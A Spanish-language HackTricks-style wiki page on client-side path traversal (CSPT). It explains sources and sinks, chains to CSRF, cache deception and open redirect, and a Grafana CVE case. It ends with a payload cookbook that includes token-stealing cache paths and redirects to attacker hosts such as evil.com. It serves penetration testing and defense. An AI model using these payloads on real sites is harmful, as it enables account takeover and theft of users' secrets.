# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Información básica

Un client side path traversal ocurre cuando puedes **manipular el path de una URL** que va a ser **enviada a un usuario para que la visite de manera legítima** o que de alguna forma el usuario va a ser **forzado a visitar por ejemplo vía JS o CSS**. CSPT también es conocido como **On-Site Request Forgery (OSRF)** porque permite coaccionar el navegador de la víctima para que acceda a paths arbitrarios en el mismo origin con sus cookies, JWTs, o certificados mTLS.

Fuentes típicas (datos que controlas):

- Parámetros de ruta que se concatenan en `fetch()` o paths de XHR (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Valores almacenados (profile slugs, document IDs) que se interpolan en paths dentro de background jobs, service workers, o WebSocket URLs.
- Gadgets de UI (download/export buttons, image galleries) que añaden fragmentos controlados por el usuario o extensiones de archivo a endpoints de API antes de despachar la petición.

Sumideros típicos (donde acaba el traversal):

- Frontend API wrappers que anteponen `/api/` o `/proxy/` y reutilizan auth headers automáticamente.
- `history.pushState` / `router.navigate` helpers que reconstruyen URLs más tarde durante la hydration.
- `<link>`/`<style>`/`@import` statements generadas por contenido de CMS o payloads de feature-flag.

### Impactos comunes y cadenas

- **CSPT ➜ CSRF/OSRF**: secuestrar llamadas autenticadas `POST/PUT/DELETE` escapando del resource path previsto y luego reingresar a endpoints sensibles (restablecimiento de contraseña, aprobación de pagos, revocación de acceso). Combínalo con la checklist de [CSRF](csrf-cross-site-request-forgery.md) para escalar.
- **CSPT ➜ cache deception / poisoning**: servir JSON controlado por el atacante desde claves públicas del CDN y reproducirlo de forma no autenticada. Ver [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: el traversal aterriza en un endpoint de open redirect, que luego redirige a infraestructura del atacante que sirve JS malicioso o payloads SSRF. Enlazar con abusos de [Open Redirect](open-redirect.md).

### Ejemplos de hallazgos

- En [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), fue posible **cambiar el invite URL** de modo que terminara **cancelando una tarjeta**.
- En [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), se pudo combinar un **client side path traversal vía CSS** (era posible cambiar el path desde donde se cargaba un recurso CSS) con un **open redirect** para cargar el recurso CSS desde un **dominio controlado por el atacante**.
- En [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), se muestra una técnica de cómo abusar de CSPT **para realizar un ataque CSRF**. Esto se hace **monitorizando todos los datos** que un atacante puede controlar (URL path, parámetros, fragmento, datos inyectados en la DB...) **y los sinks** donde estos datos terminan (peticiones que se realizan).
- Revisa [**esta extensión de navegador**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) para monitorizar eso.
- Prueba este [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) para experimentar la técnica.
- Revisa [**este tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) sobre cómo usar la extensión del navegador en el playground.

## CSPT-assisted web cache poisoning/deception

CSPT puede encadenarse con el caching basado en extensiones de CDN para exfiltrar sensitive JSON leaked by authenticated API calls:

- Un frontend concatena input controlado por el usuario en un API path y adjunta authentication headers en fetch/XHR.
- Inyectando dot-segments (../) puedes redirigir la petición autenticada a un endpoint diferente en el mismo origin.
- Si ese endpoint (o una variante de path con un sufijo de apariencia estática como .css) es cacheado por el CDN sin variar según los auth headers, la respuesta autenticada de la víctima puede almacenarse bajo una key de cache pública y recuperarse por cualquiera.

Receta rápida:

1) Encuentra código SPA que construya API URLs a partir de parámetros de path mientras envía auth headers.
2) Identifica endpoints sensibles y prueba sufijos estáticos (.css, .js, .jpg, .json) para ver si el CDN cambia a Cache-Control: public/max-age y X-Cache: Hit mientras devuelve JSON.
3) Atrae a la víctima a una URL que inyecte traversal en el parámetro del SPA para que el fetch autenticado golpee la variante de path cacheable (por ejemplo, ../../../v1/token.css).
4) Lee la misma URL de forma anónima para obtener el secreto cacheado (token → ATO).

Consulta detalles y mitigaciones en la página de Cache Deception: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Flujo de trabajo y herramientas

### Detección pasiva con proxies interceptores

- **Correlate sources/sinks automatically**: la [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parsea tu historial de proxy, agrupa parámetros que luego se reflejan dentro de los paths de otras requests, y puede reemitir URLs proof-of-concept con canary tokens para confirmar traversals explotables. Después de cargar el JAR, ajusta el `Source Scope` a parámetros del cliente (p. ej., `id`, `slug`) y los `Sink Methods` a `GET, POST, DELETE` para que la extensión destaque constructores de request peligrosos. Puedes exportar todas las fuentes sospechosas con un canary embebido para validarlas en lote.
- **Look for double-URL-decoding**: al navegar con Burp o ZAP, observa patrones `/api/%252e%252e/` que son normalizados por el frontend antes de golpear la red—estos suelen aparecer como bodies JSON codificados en base64 que referencian el estado de rutas y son fáciles de pasar por alto sin un scanner automatizado.

### Instrumentar sinks de SPA manualmente

Inyectar un snippet corto en DevTools ayuda a exponer traversals ocultos mientras interactúas con la UI:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Añade envoltorios similares alrededor de `XMLHttpRequest.prototype.open`, `history.pushState` y routers específicos de frameworks (p. ej., `next/router`). Observar `init.credentials === "include"` reduce rápidamente las solicitudes que llevan cookies de sesión.
- Si la app guarda pistas de enrutamiento en IndexedDB/localStorage, edita esas entradas con traversal payloads y recarga—el estado mutado a menudo se reinyecta en las solicitudes pre-hydration.

### Laboratorio & payload rehearsal

- Levanta el CSPT Playground vía `docker compose up` y practica encadenar traversal ➜ CSRF ➜ stored XSS flows sin tocar el objetivo. Reproducir la estructura del router del objetivo localmente facilita crear PoCs compartibles.
- Mantén un bloc de notas con variaciones exitosas de dot-segment (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) y trucos de sufijo (`.css`, `.json`, `;` matrix params) que observaste durante el recon para poder reproducirlos rápidamente cuando aparezca un nuevo sink.

## Estudios de caso recientes (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – Un traversal gadget dentro de `/public/plugins/` permitió a los atacantes introducir `../../` en el plugin asset loader, encadenarlo con el open redirect de Grafana y forzar a las víctimas a cargar bundles de plugins controlados por el atacante. Cuando los anonymous dashboards estaban habilitados, una URL creada como `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` provocó que el navegador ejecutara JavaScript remoto; si el Image Renderer plugin estaba instalado, la misma primitive podía convertirse en SSRF redirigiendo solicitudes de render hacia hosts internos. Siempre prueba rutas de assets de plugins, anonymous dashboards y renderer endpoints juntos porque un solo traversal a menudo te da ángulos tanto de XSS como de SSRF.

## Payload cookbook

| Goal | Payload pattern | Notes |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Works when routers simply concatenate `/${doc}`. Add `.json` if CDN only caches static-looking assets. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Combina con redireccionadores de confianza listados en el código del objetivo. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | El CDN puede tratar `.css` como estático y cachear secretos devueltos como JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Algunos routers aceptan overrides `_method`; combínalo con traversal para reorientar endpoints destructivos. |

## Referencias

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
